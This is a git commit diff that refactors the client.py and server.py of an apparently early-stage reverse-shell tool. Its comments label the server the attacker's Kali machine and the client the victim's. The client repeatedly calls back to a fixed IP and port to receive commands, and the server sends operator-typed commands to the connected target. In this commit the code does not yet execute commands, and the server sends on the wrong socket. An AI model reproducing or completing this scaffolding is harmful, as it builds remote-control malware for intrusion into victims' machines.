da511467417f92f46a11ca3631d0d1d019cc980a
ben-ju1 <nulledenju@gmail.com>
2020-12-17 13:33:45 +0100

    Must fix the shell

--- client.py
+++ client.py
@@ -1,25 +1,44 @@
 import socket
 import time
 
-def connection():
-    # Define the number of seconds to wait
-    time.sleep(5)
-    print('[*] Trying to connect...')
-    #  Infinite loop so the program tries to connect every N seconds
-    while True:
-        try:
-            # tries to connect to the server
-            sock.connect(('192.168.1.17', 5555))
-            print("[+] Connected")
-            #     shell()
-            sock.close()
-            # it breaks the loop if I can connect since no error has been thrown
-            break
-        except:
-            # if it throws an error then
-            connection()
+
+class Client:
+
+    def __init__(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    def connection(self):
+        """
+            Tries to connect to the Server each N seconds then calls the shell function
+        """
+        # Define the number of seconds to wait
+        time.sleep(2)
+        print('[+] Trying to connect...')
+        #  Infinite loop so the program tries to connect every N seconds
+        while True:
+            try:
+                # tries to connect to the server
+                self.sock.connect(('192.168.1.17', 5555))
+                print("[+] Connection established")
+                self.shell()
+                self.sock.close()
+                print('Socket is closed.')
+                # it breaks the loop if I can connect since no error has been thrown
+                break
+            except:
+                # if it throws an error then
+                self.connection()
+
+    def shell(self):
+        """
+            Listen to the commands made by the Server.
+        """
+        while True:
+            message = self.sock.recv(1024)
+            if message == 'ter':
+                break
+            self.sock.send('Dummy response from the client... :0)'.encode('utf-8'))
 
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-connection()
+if __name__ == '__main__':
+    Client().connection()
--- server.py
+++ server.py
@@ -1,21 +1,51 @@
 # Socket allows us to initiate an internet connection between 2 machines
 import socket
+import time
 
-# socket.AF_INET -> tells our program that it's ipv4
-# socket.SOCK_STREAM -> tells our program that we'll use TCP
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# We bind the server to the HOST (KALI LINUX MACHINE)
-sock.bind(('192.168.1.17', 5555))
+class Server:
 
-# We must start listening the incoming connection (VICTIM MACHINE)
-print('[*] Listening for the incoming connection')
-# Our program will be stuck on this part until the connection established
-# 5 mean that we will listen up to 5 connections
-sock.listen(5)
-# Once the VICTIM connect -> we retrieve the informations of the connection
-target, ip = sock.accept()
-print(f'[+] Target connected from {str(ip)}')
-# target_communication()
+    def __init__(self):
+        # socket.AF_INET -> tells our program that it's ipv4
+        # socket.SOCK_STREAM -> tells our program that we'll use TCP
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.addr = ''
+        self.target = None
 
-# TODO Try to request from different machines
+    def connection_handler(self):
+        """
+            Ensure the connection between the server and the client.
+            When the connection has been properly calls the shell function
+        """
+
+        # We bind the server to the HOST (KALI LINUX MACHINE)
+        self.sock.bind(('192.168.1.17', 5555))
+
+        # We must start listening the incoming connection (VICTIM MACHINE)
+        print('[+] Listening for the incoming connection')
+        # Our program will be stuck on this part until the connection established
+        # 1 mean that we will listen up to 1 connections
+        self.sock.listen(1)
+        # Once the VICTIM connect -> we retrieve the information of the connection
+        self.target, self.addr = self.sock.accept()
+
+        print(f'[+] Target connected from {str(self.addr)}')
+        self.shell()
+
+        self.sock.close()
+        print('Socket is closed.')
+
+    def shell(self):
+        """
+            Listen to input, encode it in UTF-8 then send it to the client
+        """
+        # listen to my command line
+        command = input(f'shell#~{self.addr[0]}@{self.addr[1]}: ')
+        # encode it to bytes
+        command_as_bytes = command.encode('utf-8')
+        # and send it
+        self.sock.send(command_as_bytes)
+
+
+if __name__ == '__main__':
+    Server().connection_handler()
